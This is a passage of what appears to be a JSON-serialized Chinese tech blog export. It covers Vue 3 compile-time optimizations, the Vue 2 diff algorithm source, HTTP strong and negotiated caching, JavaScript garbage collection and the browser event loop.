1 &lt;&lt; 10, // 动态 solt HOISTED = -1, // 特殊标志是负整数表示永远不会用作 diff BAIL = -2 // 一个特殊的标志，指代差异算法&#125; 静态提升Vue3中堆不参与更新得元素，会做静态提升，只会被创建一次，在渲染时直接复用，这样就免去了重复的创建节点，大型应用会受益于这个改动，免去重复的创建操作，优化了运行时候的内存占用 123&lt;span&gt;你好&lt;/span&gt;&lt;div&gt;&#123;&#123; message &#125;&#125;&lt;/div&gt; 没有做静态提升之前 123456export function render(_ctx, _cache, $props, $setup, $data, $options) &#123; return (_openBlock(), _createBlock(_Fragment, null, [ _createVNode(&quot;span&quot;, null, &quot;你好&quot;), _createVNode(&quot;div&quot;, null, _toDisplayString(_ctx.message), 1 /* TEXT */) ], 64 /* STABLE_FRAGMENT */))&#125; 做了静态提升后 12345678910const _hoisted_1 = /*#__PURE__*/_createVNode(&quot;span&quot;, null, &quot;你好&quot;, -1 /* HOISTED */)export function render(_ctx, _cache, $props, $setup, $data, $options) &#123; return (_openBlock(), _createBlock(_Fragment, null, [ _hoisted_1, _createVNode(&quot;div&quot;, null, _toDisplayString(_ctx.message), 1 /* TEXT */) ], 64 /* STABLE_FRAGMENT */))&#125;// Check the console for the AST 静态内容_hosted_1被放置在render函数外，每次渲染的时候只要取_hosted_即可，同时_hosted_1被打上PatchFlag,静态标记为-1，特殊标记是负整数表示永远不会用于Diff 事件监听缓存默认情况下绑定事件行为会被认为是动态绑定，所以每次都会去追踪它的变化 123&lt;div&gt; &lt;button @click = &#x27;onClick&#x27;&gt;点我&lt;/button&gt;&lt;/div&gt; 没开启事件监听器缓存 123456export const render = /*#__PURE__*/_withId(function render(_ctx, _cache, $props, $setup, $data, $options) &#123; return (_openBlock(), _createBlock(&quot;div&quot;, null, [ _createVNode(&quot;button&quot;, &#123; onClick: _ctx.onClick &#125;, &quot;点我&quot;, 8 /* PROPS */, [&quot;onClick&quot;]) // PROPS=1&lt;&lt;3,// 8 //动态属性，但不包含类名和样式 ]))&#125;) 开启事件监听器缓存 1234567export function render(_ctx, _cache, $props, $setup, $data, $options) &#123; return (_openBlock(), _createBlock(&quot;div&quot;, null, [ _createVNode(&quot;button&quot;, &#123; onClick: _cache[1] || (_cache[1] = (...args) =&gt; (_ctx.onClick(...args))) &#125;, &quot;点我&quot;) ]))&#125; 开启缓存后，没有了静态标记，也就是说下次diff算法的时候直接使用 SSR优化当静态内容大到一定量级，会用createStaticVNode方法在客户端生成一个static node,这些静态node,会被直接innerHtml,就不需要创建对象，任何根据对象渲染 123456789div&gt; &lt;div&gt; &lt;span&gt;你好&lt;/span&gt; &lt;/div&gt; ... // 很多个静态属性 &lt;div&gt; &lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/div&gt; 编译后 1234567891011import &#123; mergeProps as _mergeProps &#125; from &quot;vue&quot;import &#123; ssrRenderAttrs as _ssrRenderAttrs, ssrInterpolate as _ssrInterpolate &#125; from &quot;@vue/server-renderer&quot;export function ssrRender(_ctx, _push, _parent, _attrs, $props, $setup, $data, $options) &#123; const _cssVars = &#123; style: &#123; color: _ctx.color &#125;&#125; _push(`&lt;div$&#123; _ssrRenderAttrs(_mergeProps(_attrs, _cssVars)) &#125;&gt;&lt;div&gt;&lt;span&gt;你好&lt;/span&gt;...&lt;div&gt;&lt;span&gt;你好&lt;/span&gt;&lt;div&gt;&lt;span&gt;$&#123; _ssrInterpolate(_ctx.message) &#125;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;`)&#125; 源码体积相比Vue2,Vue3整体体积变小，除了移除一些不常用API，最重要的是Tree shaking,任何一个函数，如ref,reactive,computed,仅仅在用到的时候才打包，没用到的模块都被摇掉，打包的整体体积变小 响应式系统vue2采用的是defineProperty来劫持整个对象，然后进行深度遍历所有属性，给每个属性添加getter,setter,实现响应式,而vue3采用proxy重写响应式系统，因为proxy可以对整个对象进行监听，所有不需要深度遍历 可以监听动态属性的添加 可以监听到数组索引和数组length属性 可以监听删除属性","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Vue diff算法","slug":"Vue-diff算法","date":"2022-05-03T07:53:37.000Z","updated":"2022-07-09T07:50:08.059Z","comments":true,"path":"2022/05/03/Vue-diff算法/","link":"","permalink":"https://coloey.github.io/2022/05/03/Vue-diff%E7%AE%97%E6%B3%95/","excerpt":"","text":"先阅读尤大的文章： https://www.zhihu.com/question/31809713/answer/53544875 比较innerHTML和Virtual DOM的重绘性能消耗 innerHTML:render html string O(template size)+重新创建所有DOM元素O(DOM size) Vitual DOM :render Vitual DOM +diff O(template size)+必要的DOM更新O Vitual DOM render+diff显然比渲染html字符慢，但是它依然his纯js层面计算，比DOM操作而言，便宜了很多 一、是什么diff算法是一种同层的树节点进行比较的高效算法 两个特点： 比较只会在同层级进行，不会跨层级比较 在diff比较过程中，循环会从两边向中间比较 diff 算法的在很多场景下都有应用，在 vue 中，作用于虚拟 dom 渲染成真实 dom 的新旧 VNode 节点比较 二、比较方式diff整体策略为：深度优先，同层比较 比较只会在同层级进行, 不会跨层级比较 比较的过程中，循环从两边向中间收拢 下面举个vue通过diff算法更新的例子： 新旧VNode节点如下图所示： 第一次循环后，发现旧节点D与新节点D相同，直接复用旧节点D作为diff后的第一个真实节点，同时旧节点endIndex移动到C，新节点的 startIndex 移动到了 C 第二次循环后，同样是旧节点的末尾和新节点的开头(都是 C)相同，同理，diff 后创建了 C 的真实节点插入到第一次创建的 B 节点后面。同时旧节点的 endIndex 移动到了 B，新节点的 startIndex 移动到了 E 第三次循环中，发现E没有找到，这时候只能直接创建新的真实节点 E，插入到第二次创建的 C 节点之后。同时新节点的 startIndex 移动到了 A。旧节点的 startIndex 和 endIndex 都保持不动 第四次循环中，发现了新旧节点的开头(都是 A)相同，于是 diff 后创建了 A 的真实节点，插入到前一次创建的 E 节点后面。同时旧节点的 startIndex 移动到了 B，新节点的 startIndex 移动到了 B 第五次循环中，情形同第四次循环一样，因此 diff 后创建了 B 真实节点 插入到前一次创建的 A 节点后面。同时旧节点的 startIndex 移动到了 C，新节点的 startIndex 移动到了 F 新节点的 startIndex 已经大于 endIndex 了，需要创建 newStartIdx 和 newEndIdx 之间的所有节点，也就是节点F，直接创建 F 节点对应的真实节点放到 B 节点后面 三、原理分析当数据发生改变时，set方法会调用Dep.notify通知所有订阅者Watcher，订阅者就会调用patch给真实的DOM打补丁，更新相应的视图 源码位置：src/core/vdom/patch.js 12345678910111213141516171819202122232425262728293031323334353637function patch(oldVnode, vnode, hydrating, removeOnly) &#123; if (isUndef(vnode)) &#123; // 没有新节点，直接执行destory钩子函数 if (isDef(oldVnode)) invokeDestroyHook(oldVnode) return &#125; let isInitialPatch = false const insertedVnodeQueue = [] if (isUndef(oldVnode)) &#123; isInitialPatch = true createElm(vnode, insertedVnodeQueue) // 没有旧节点，直接用新节点生成dom元素 &#125; else &#123; const isRealElement = isDef(oldVnode.nodeType) if (!isRealElement &amp;&amp; sameVnode(oldVnode, vnode)) &#123; // 判断旧节点和新节点自身一样，一致执行patchVnode patchVnode(oldVnode, vnode, insertedVnodeQueue, null, null, removeOnly) &#125; else &#123; // 否则直接销毁及旧节点，根据新节点生成dom元素 if (isRealElement) &#123; if (oldVnode.nodeType === 1 &amp;&amp; oldVnode.hasAttribute(SSR_ATTR)) &#123; oldVnode.removeAttribute(SSR_ATTR) hydrating = true &#125; if (isTrue(hydrating)) &#123; if (hydrate(oldVnode, vnode, insertedVnodeQueue)) &#123; invokeInsertHook(vnode, insertedVnodeQueue, true) return oldVnode &#125; &#125; oldVnode = emptyNodeAt(oldVnode) &#125; return vnode.elm &#125; &#125;&#125; patch函数前两个参数位为oldVnode 和 Vnode ，分别代表旧的节点和新节点，主要做了四个判断： 没有新节点，直接触发旧节点的destory钩子 没有旧节点，说明是页面刚开始初始化的时候，此时，根本不需要比较了，直接全是新建，所以只调用 createElm 旧节点和新节点自身一样，通过 sameVnode 判断节点是否一样，一样时，直接调用 patchVnode 去处理这两个节点 旧节点和新节点自身不一样，当两个节点不一样的时候，直接创建新节点，删除旧节点 下面主要讲的是patchVnode部分 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273function patchVnode (oldVnode, vnode, insertedVnodeQueue, removeOnly) &#123; // 如果新旧节点一致，什么都不做 if (oldVnode === vnode) &#123; return &#125; // 让vnode.el引用到现在的真实dom，当el修改时，vnode.el会同步变化 const elm = vnode.elm = oldVnode.elm // 异步占位符 if (isTrue(oldVnode.isAsyncPlaceholder)) &#123; if (isDef(vnode.asyncFactory.resolved)) &#123; hydrate(oldVnode.elm, vnode, insertedVnodeQueue) &#125; else &#123; vnode.isAsyncPlaceholder = true &#125; return &#125; // 如果新旧都是静态节点，并且具有相同的key // 当vnode是克隆节点或是v-once指令控制的节点时，只需要把oldVnode.elm和oldVnode.child都复制到vnode上 // 也不用再有其他操作 if (isTrue(vnode.isStatic) &amp;&amp; isTrue(oldVnode.isStatic) &amp;&amp; vnode.key === oldVnode.key &amp;&amp; (isTrue(vnode.isCloned) || isTrue(vnode.isOnce)) ) &#123; vnode.componentInstance = oldVnode.componentInstance return &#125; let i const data = vnode.data if (isDef(data) &amp;&amp; isDef(i = data.hook) &amp;&amp; isDef(i = i.prepatch)) &#123; i(oldVnode, vnode) &#125; const oldCh = oldVnode.children const ch = vnode.children if (isDef(data) &amp;&amp; isPatchable(vnode)) &#123; for (i = 0; i &lt; cbs.update.length; ++i) cbs.update[i](oldVnode, vnode) if (isDef(i = data.hook) &amp;&amp; isDef(i = i.update)) i(oldVnode, vnode) &#125; // 如果vnode不是文本节点或者注释节点 if (isUndef(vnode.text)) &#123; // 并且都有子节点 if (isDef(oldCh) &amp;&amp; isDef(ch)) &#123; // 并且子节点不完全一致，则调用updateChildren if (oldCh !== ch) updateChildren(elm, oldCh, ch, insertedVnodeQueue, removeOnly) // 如果只有新的vnode有子节点 &#125; else if (isDef(ch)) &#123; if (isDef(oldVnode.text)) nodeOps.setTextContent(elm, &#x27;&#x27;) // elm已经引用了老的dom节点，在老的dom节点上添加子节点 addVnodes(elm, null, ch, 0, ch.length - 1, insertedVnodeQueue) // 如果新vnode没有子节点，而Oldvnode有子节点，直接删除老的oldCh &#125; else if (isDef(oldCh)) &#123; removeVnodes(elm, oldCh, 0, oldCh.length - 1) // 如果老节点是文本节点 &#125; else if (isDef(oldVnode.text)) &#123; nodeOps.setTextContent(elm, &#x27;&#x27;) &#125; // 如果新vnode和老vnode是文本节点或注释节点 // 但是vnode.text != oldVnode.text时，只需要更新vnode.elm的文本内容就可以 &#125; else if (oldVnode.text !== vnode.text) &#123; nodeOps.setTextContent(elm, vnode.text) &#125; if (isDef(data)) &#123; if (isDef(i = data.hook) &amp;&amp; isDef(i = i.postpatch)) i(oldVnode, vnode) &#125; &#125; patchVnode主要做了几个判断： 新节点是否是文本节点，如果是，则直接更新dom的文本内容为新节点的文本内容 新节点和旧节点如果都有子节点，则处理比较更新子节点 只有新节点有子节点，旧节点没有，那么不用比较了，所有节点都是全新的，所以直接全部新建就好了，新建是指创建出所有新DOM，并且添加进父节点 只有旧节点有子节点而新节点没有，说明更新后的页面，旧节点全部都不见了，那么要做的，就是把所有的旧节点删除，也就是直接把DOM 删除 子节点不完全一致，则调用updateChildren 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109function updateChildren (parentElm, oldCh, newCh, insertedVnodeQueue, removeOnly) &#123; let oldStartIdx = 0 // 旧头索引 let newStartIdx = 0 // 新头索引 let oldEndIdx = oldCh.length - 1 // 旧尾索引 let newEndIdx = newCh.length - 1 // 新尾索引 let oldStartVnode = oldCh[0] // oldVnode的第一个child let oldEndVnode = oldCh[oldEndIdx] // oldVnode的最后一个child let newStartVnode = newCh[0] // newVnode的第一个child let newEndVnode = newCh[newEndIdx] // newVnode的最后一个child let oldKeyToIdx, idxInOld, vnodeToMove, refElm // removeOnly is a special flag used only by &lt;transition-group&gt; // to ensure removed elements stay in correct relative positions // during leaving transitions const canMove = !removeOnly // 如果oldStartVnode和oldEndVnode重合，并且新的也都重合了，证明diff完了，循环结束 while (oldStartIdx &lt;= oldEndIdx &amp;&amp; newStartIdx &lt;= newEndIdx) &#123; // 如果oldVnode的第一个child不存在 if (isUndef(oldStartVnode)) &#123; // oldStart索引右移 oldStartVnode = oldCh[++oldStartIdx] // Vnode has been moved left // 如果oldVnode的最后一个child不存在 &#125; else if (isUndef(oldEndVnode)) &#123; // oldEnd索引左移 oldEndVnode = oldCh[--oldEndIdx] // oldStartVnode和newStartVnode是同一个节点 &#125; else if (sameVnode(oldStartVnode, newStartVnode)) &#123; // patch oldStartVnode和newStartVnode， 索引左移，继续循环 patchVnode(oldStartVnode, newStartVnode, insertedVnodeQueue) oldStartVnode = oldCh[++oldStartIdx] newStartVnode = newCh[++newStartIdx] // oldEndVnode和newEndVnode是同一个节点 &#125; else if (sameVnode(oldEndVnode, newEndVnode)) &#123; // patch oldEndVnode和newEndVnode，索引右移，继续循环 patchVnode(oldEndVnode, newEndVnode, insertedVnodeQueue) oldEndVnode = oldCh[--oldEndIdx] newEndVnode = newCh[--newEndIdx] // oldStartVnode和newEndVnode是同一个节点 &#125; else if (sameVnode(oldStartVnode, newEndVnode)) &#123; // Vnode moved right // patch oldStartVnode和newEndVnode patchVnode(oldStartVnode, newEndVnode, insertedVnodeQueue) // 如果removeOnly是false，则将oldStartVnode.eml移动到oldEndVnode.elm之后 canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldStartVnode.elm, nodeOps.nextSibling(oldEndVnode.elm)) // oldStart索引右移，newEnd索引左移 oldStartVnode = oldCh[++oldStartIdx] newEndVnode = newCh[--newEndIdx] // 如果oldEndVnode和newStartVnode是同一个节点 &#125; else if (sameVnode(oldEndVnode, newStartVnode)) &#123; // Vnode moved left // patch oldEndVnode和newStartVnode patchVnode(oldEndVnode, newStartVnode, insertedVnodeQueue) // 如果removeOnly是false，则将oldEndVnode.elm移动到oldStartVnode.elm之前 canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldEndVnode.elm, oldStartVnode.elm) // oldEnd索引左移，newStart索引右移 oldEndVnode = oldCh[--oldEndIdx] newStartVnode = newCh[++newStartIdx] // 如果都不匹配 &#125; else &#123; if (isUndef(oldKeyToIdx)) oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx) // 尝试在oldChildren中寻找和newStartVnode的具有相同的key的Vnode idxInOld = isDef(newStartVnode.key) ? oldKeyToIdx[newStartVnode.key] : findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx) // 如果未找到，说明newStartVnode是一个新的节点 if (isUndef(idxInOld)) &#123; // New element // 创建一个新Vnode createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm) // 如果找到了和newStartVnodej具有相同的key的Vnode，叫vnodeToMove &#125; else &#123; vnodeToMove = oldCh[idxInOld] /* istanbul ignore if */ if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; !vnodeToMove) &#123; warn( &#x27;It seems there are duplicate keys that is causing an update error. &#x27; + &#x27;Make sure each v-for item has a unique key.&#x27; ) &#125; // 比较两个具有相同的key的新节点是否是同一个节点 //不设key，newCh和oldCh只会进行头尾两端的相互比较，设key后，除了头尾两端的比较外，还会从用key生成的对象oldKeyToIdx中查找匹配的节点，所以为节点设置key可以更高效的利用dom。 if (sameVnode(vnodeToMove, newStartVnode)) &#123; // patch vnodeToMove和newStartVnode patchVnode(vnodeToMove, newStartVnode, insertedVnodeQueue) // 清除 oldCh[idxInOld] = undefined // 如果removeOnly是false，则将找到的和newStartVnodej具有相同的key的Vnode，叫vnodeToMove.elm // 移动到oldStartVnode.elm之前 canMove &amp;&amp; nodeOps.insertBefore(parentElm, vnodeToMove.elm, oldStartVnode.elm) // 如果key相同，但是节点不相同，则创建一个新的节点 &#125; else &#123; // same key but different element. treat as new element createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm) &#125; &#125; // 右移 newStartVnode = newCh[++newStartIdx] &#125; &#125; while循环主要处理了以下五种情景： 当新老 VNode 节点的 start 相同时，直接 patchVnode ，同时新老 VNode 节点的开始索引都加 1 当新老 VNode 节点的 end相同时，同样直接 patchVnode ，同时新老 VNode 节点的结束索引都减 1 当老 VNode 节点的 start 和新 VNode 节点的 end 相同时，这时候在 patchVnode 后，还需要将当前真实 dom 节点移动到 oldEndVnode 的后面，同时老 VNode 节点开始索引加 1，新 VNode 节点的结束索引减 1 当老 VNode 节点的 end 和新 VNode 节点的 start 相同时，这时候在 patchVnode 后，还需要将当前真实 dom 节点移动到 oldStartVnode 的前面，同时老 VNode 节点结束索引减 1，新 VNode 节点的开始索引加 1 如果都不满足以上四种情形，那说明没有相同的节点可以复用，则会分为以下两种情况： 从旧的 VNode 为 key 值，对应 index 序列为 value 值的哈希表中找到与 newStartVnode 一致 key 的旧的 VNode 节点，再进行patchVnode ，同时将这个真实 dom 移动到 oldStartVnode 对应的真实 dom 的前面 调用 createElm 创建一个新的 dom 节点放到当前 newStartIdx 的位置 小结 当数据发生改变时，订阅者watcher就会调用patch给真实的DOM打补丁 通过isSameVnode进行判断，相同则调用patchVnode方法 ```patchVnode 1234567891011 做了以下操作： - 找到对应的真实`dom`，称为`el` - 如果都有文本节点且不相等，将`el`文本节点设置为`Vnode`的文本节点 - 如果`oldVnode`有子节点而`VNode`没有，则删除`el`子节点 - 如果`oldVnode`没有子节点而`VNode`有，则将`VNode`的子节点真实化后添加到`el` - 如果两者都有子节点，则执行`updateChildren`函数比较子节点- ``` updateChildren 主要做了以下操作： 设置新旧VNode的头尾指针 新旧头尾指针进行比较，循环向中间靠拢，根据情况调用patchVnode进行patch重复流程、调用createElem创建一个新节点，从哈希表寻找 key一致的VNode 节点再分情况操作","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Composition API 与Options API","slug":"Composition-API-与Options-API","date":"2022-05-03T06:46:26.000Z","updated":"2022-05-03T06:46:26.485Z","comments":true,"path":"2022/05/03/Composition-API-与Options-API/","link":"","permalink":"https://coloey.github.io/2022/05/03/Composition-API-%E4%B8%8EOptions-API/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"强缓存和协商缓存","slug":"强缓存和协商缓存","date":"2022-05-02T14:40:35.000Z","updated":"2022-05-08T02:01:26.448Z","comments":true,"path":"2022/05/02/强缓存和协商缓存/","link":"","permalink":"https://coloey.github.io/2022/05/02/%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98/","excerpt":"","text":"这里说的缓存是指浏览器（客户端）在本地磁盘中对访问过的资源保存的副本文件。 浏览器缓存主要有以下几个优点： 减少重复数据请求，避免通过网络再次加载资源，节省流量。 降低服务器的压力，提升网站性能。 加快客户端加载网页的速度， 提升用户体验。 浏览器缓存分为强缓存和协商缓存，两者有两个比较明显的区别： 如果浏览器命中强缓存，则不需要给服务器发请求；而协商缓存是由服务器来决定是否使用缓存，即客户端与服务器之间一定存在一次通信。 在 chrome 中强缓存（虽然没有发出真实的 http 请求）的请求状态码返回是 200 (from cache)；而协商缓存如果命中走缓存的话，请求的状态码是 304 (not modified)。 不同浏览器的策略不同，在 Fire Fox中，from cache 状态码是 304. 请求流程浏览器在第一次请求后缓存资源，再次请求时，会进行下面两个步骤： 浏览器会获取该缓存资源的 header 中的信息，根据 response header 中的 expires 和 cache-control 来判断是否命中强缓存，如果命中则直接从缓存中获取资源。 如果没有命中强缓存，浏览器就会发送请求到服务器，这次请求会带上 IF-Modified-Since 或者 IF-None-Match, 它们的值分别是第一次请求返回 Last-Modified或者 Etag，由服务器来对比这一对字段来判断是否命中。如果命中，则服务器返回 304 状态码，并且不会返回资源内容，浏览器会直接从缓存获取；否则服务器最终会返回资源的实际内容，并更新 header 中的相关缓存字段。 强缓存强缓存是根据返回头中的 Expires 或者 Cache-Control 两个字段来控制的，都是表示资源的缓存有效时间。 Expires 是 http 1.0 的规范，值是一个GMT 格式的时间点字符串，比如 Expires:Mon,18 Oct 2066 23:59:59 GMT 。这个时间点代表资源失效的时间，如果当前的时间戳在这个时间之前，则判定命中缓存。有一个缺点是，失效时间是一个绝对时间，以服务器的时间为准，如果服务器时间与客户端时间偏差较大时，就会导致缓存混乱。而服务器的时间跟用户的实际时间是不一样是很正常的，所以 Expires 在实际使用中会带来一些麻烦。 Cache-Control这个字段是 http 1.1 的规范，一般常用该字段的 max-age 值来进行判断，它是一个相对时间，比如 .Cache-Control:max-age=3600 代表资源的有效期是 3600 秒。并且返回头中的 Date 表示消息发送的时间，表示当前资源在 Date ~ Date +3600s 这段时间里都是有效的。不过我在实际使用中常常遇到设置了 max-age 之后，在 max-age 时间内重新访问资源却会返回 304 not modified ，这是由于服务器的时间与本地的时间不同造成的。当然 Cache-Control 还有其他几个值可以设置， 不过相对来说都很少用了： no-cache 不使用本地缓存。需要使用协商缓存。 no-store直接禁止浏览器缓存数据，每次请求资源都会向服务器要完整的资源， 类似于 network 中的 disabled cache。 public 可以被所有用户缓存，包括终端用户和 cdn 等中间件代理服务器。 private 只能被终端用户的浏览器缓存。 如果 Cache-Control与 Expires 同时存在的话， Cache-Control 的优先级高于 Expires 。 协商缓存协商缓存是由服务器来确定缓存资源是否可用。 主要涉及到两对属性字段，都是成对出现的，即第一次请求的响应头带上某个字, Last-Modified 或者 Etag，则后续请求则会带上对应的请求字段 If-Modified-Since或者 If-None-Match，若响应头没有 Last-Modified 或者 Etag 字段，则请求头也不会有对应的字段。 Last-Modified/If-Modified-Since 二者的值都是 GMT 格式的时间字符串， Last-Modified 标记最后文件修改时间， 下一次请求时，请求头中会带上 If-Modified-Since 值就是 Last-Modified 告诉服务器我本地缓存的文件最后修改的时间，在服务器上根据文件的最后修改时间判断资源是否有变化， 如果文件没有变更则返回 304 Not Modified ，请求不会返回资源内容，浏览器直接使用本地缓存。当服务器返回 304 Not Modified 的响应时，response header 中不会再添加的 Last-Modified 去试图更新本地缓存的 Last-Modified， 因为既然资源没有变化，那么 Last-Modified 也就不会改变；如果资源有变化，就正常返回返回资源内容，新的 Last-Modified 会在 response header 返回，并在下次请求之前更新本地缓存的 Last-Modified，下次请求时，If-Modified-Since会启用更新后的 Last-Modified。 Etag/If-None-Match， 值都是由服务器为每一个资源生成的唯一标识串，只要资源有变化就这个值就会改变。服务器根据文件本身算出一个哈希值并通过 ETag字段返回给浏览器，接收到 If-None-Match 字段以后，服务器通过比较两者是否一致来判定文件内容是否被改变。与 Last-Modified 不一样的是，当服务器返回 304 Not Modified 的响应时，由于在服务器上ETag 重新计算过，response header中还会把这个 ETag 返回，即使这个 ETag 跟之前的没有变化。 HTTP 中并没有指定如何生成 ETag，可以由开发者自行生成，哈希是比较理想的选择。 ETag的出现，主要是为了解决 Last-Modified 无法解决的一些问题： 某些服务器不能精确得到文件的最后修改时间， 这样就无法通过最后修改时间来判断文件是否更新了。 某些文件的修改非常频繁，在秒以下的时间内进行修改. Last-Modified只能精确到秒。 一些文件的最后修改时间改变了，但是内容并未改变。 我们不希望客户端认为这个文件修改了","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"HTTP","slug":"计算机网络/HTTP","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/"}],"tags":[]},{"title":"浏览器垃圾回收机制","slug":"浏览器垃圾回收机制","date":"2022-05-02T08:04:33.000Z","updated":"2022-05-02T08:29:52.291Z","comments":true,"path":"2022/05/02/浏览器垃圾回收机制/","link":"","permalink":"https://coloey.github.io/2022/05/02/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/","excerpt":"","text":"标记清理 变量进入上下文，会加上标记，证明其存在于该上下文 将所有在上下文中的变量以及上下文中被访问引用的变量标记去掉，表明这些变量活跃有用 在此之后再被加上标记的变量标记为准备删除的变量，原因是任何在上下文中的变量都访问不到它们 执行内存清理，销毁标记的所有非活跃值并回收之前被占用的内存 引用计数引用计数策略相对而言不常用，弊端较多，其思路对每个值记录它被引用的次数，通过最后对次数的判断（引用数为0）来决定是否保留，具体规则： 声明一个变量，赋予它一个引用值，计数+1 同一值被赋予另外一个变量，引用+1 保存对该值引用的变量被其他值覆盖，引用+1 引用为0，回收内存 局限：容易造成循环引用 123456function problem()&#123; let a=new Object() let b=new Object() a.c=b; b.d=a;&#125; a和b通过各自的属性相互引用，意味着它们的引用数都为2，在函数结束后，这两个对象不再作用域内，在引用计数策略下，a和b在函数结束后还会存在，因为它们的引用数永远捕获变为0，如果函数被多次调用就会导致大量内存永远不会被释放。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"浏览器事件循环机制和Node中的事件循环机制","slug":"浏览器事件循环机制和Node中的事件循环机制","date":"2022-05-02T03:58:28.000Z","updated":"2022-05-02T16:00:45.534Z","comments":true,"path":"2022/05/02/浏览器事件循环机制和Node中的事件循环机制/","link":"","permalink":"https://coloey.github.io/2022/05/02/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E5%92%8CNode%E4%B8%AD%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/","excerpt":"","text":"浏览器的事件循环机制：是什么JavaScript 在设计之初便是单线程，即指程序运行时，只有一个线程存在，同一时间只能做一件事 为什么要这么设计，跟JavaScript的应用场景有关 JavaScript 初期作为一门浏览器脚本语言，通常用于操作 DOM ，如果是多线程，一个线程进行了删除 DOM ，另一个添加 DOM，此时浏览器该如何处理？ 为了解决单线程运行阻塞问题，JavaScript用到了计算机系统的一种运行机制，这种机制就叫做事件循环（Event Loop） 事件循环（Event Loop）在JavaScript中，所有的任务都可以分为 同步任务：立即执行的任务，同步任务一般会直接进入到主线程中执行 异步任务：异步执行的任务，比如ajax网络请求，setTimeout 定时函数等 从上面我们可以看到，同步任务进入主线程，即主执行栈，异步任务进入任务队列，主线程内的任务执行完毕为空，会去任务队列读取对应的任务，推入主线程执行。上述过程的不断重复就是事件循环 宏任务与微任务如果将任务划分为同步任务和异步任务并不是那么的准确，举个例子： 1234567891011121314console.log(1)setTimeout(()=&gt;&#123; console.log(2)&#125;, 0)new Promise((resolve, reject)=&gt;&#123; console.log(&#x27;new Promise&#x27;) resolve()&#125;).then(()=&gt;&#123; console.log(&#x27;then&#x27;)&#125;)console.log(3) 如果按照上面流程图来分析代码，我们会得到下面的执行步骤： console.log(1) ，同步任务，主线程中执行 setTimeout() ，异步任务，放到 Event Table，0 毫秒后console.log(2) 回调推入 Event Queue 中 new Promise ，同步任务，主线程直接执行 .then ，异步任务，放到 Event Table console.log(3)，同步任务，主线程执行 所以按照分析，它的结果应该是 1 =&gt; &#39;new Promise&#39; =&gt; 3 =&gt; 2 =&gt; &#39;then&#39; 但是实际结果是：1=&gt;&#39;new Promise&#39;=&gt; 3 =&gt; &#39;then&#39; =&gt; 2 出现分歧的原因在于异步任务执行顺序，事件队列其实是一个“先进先出”的数据结构，排在前面的事件会优先被主线程读取 例子中 setTimeout回调事件是先进入队列中的，按理说应该先于 .then 中的执行，但是结果却偏偏相反 原因在于异步任务还可以细分为微任务与宏任务 微任务一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前 常见的微任务有： Promise.then MutaionObserver Object.observe（已废弃；Proxy 对象替代） process.nextTick（Node.js） 宏任务宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合 常见的宏任务有： script (可以理解为外层同步代码) setTimeout/setInterval UI rendering/UI事件 postMessage、MessageChannel setImmediate、I/O（Node.js） 按照这个流程，它的执行机制是： 执行一个宏任务，如果遇到微任务就将它放到微任务的事件队列中 当前宏任务执行完成后，会查看微任务的事件队列，然后将里面的所有微任务依次执行完 回到上面的题目 1234567891011console.log(1)setTimeout(()=&gt;&#123; console.log(2)&#125;, 0)new Promise((resolve, reject)=&gt;&#123; console.log(&#x27;new Promise&#x27;) resolve()&#125;).then(()=&gt;&#123; console.log(&#x27;then&#x27;)&#125;)console.log(3) 流程如下 1234567// 遇到 console.log(1) ，直接打印 1// 遇到定时器，属于新的宏任务，留着后面执行// 遇到 new Promise，这个是直接执行的，打印 &#x27;new Promise&#x27;// .then 属于微任务，放入微任务队列，后面再执行// 遇到 console.log(3) 直接打印 3// 好了本轮宏任务执行完毕，现在去微任务列表查看是否有微任务，发现 .then 的回调，执行它，打印 &#x27;then&#x27;// 当一次宏任务执行完，再去执行新的宏任务，这里就剩一个定时器的宏任务了，执行它，打印 2 async与awaitasync 是异步的意思，await 则可以理解为等待 放到一起可以理解async就是用来声明一个异步方法，而 await 是用来等待异步方法执行 asyncasync函数返回一个promise对象，下面两种方法是等效的 12345678function f() &#123; return Promise.resolve(&#x27;TEST&#x27;);&#125;// asyncF is equivalent to f!async function asyncF() &#123; return &#x27;TEST&#x27;;&#125; await正常情况下，await命令后面是一个 Promise 对象，返回该对象的结果。如果不是 Promise 对象，就直接返回对应的值 123456async function f()&#123; // 等同于 // return 123 return await 123&#125;f().then(v =&gt; console.log(v)) // 123 不管await后面跟着的是什么，await都会阻塞后面的代码 123456789101112async function fn1 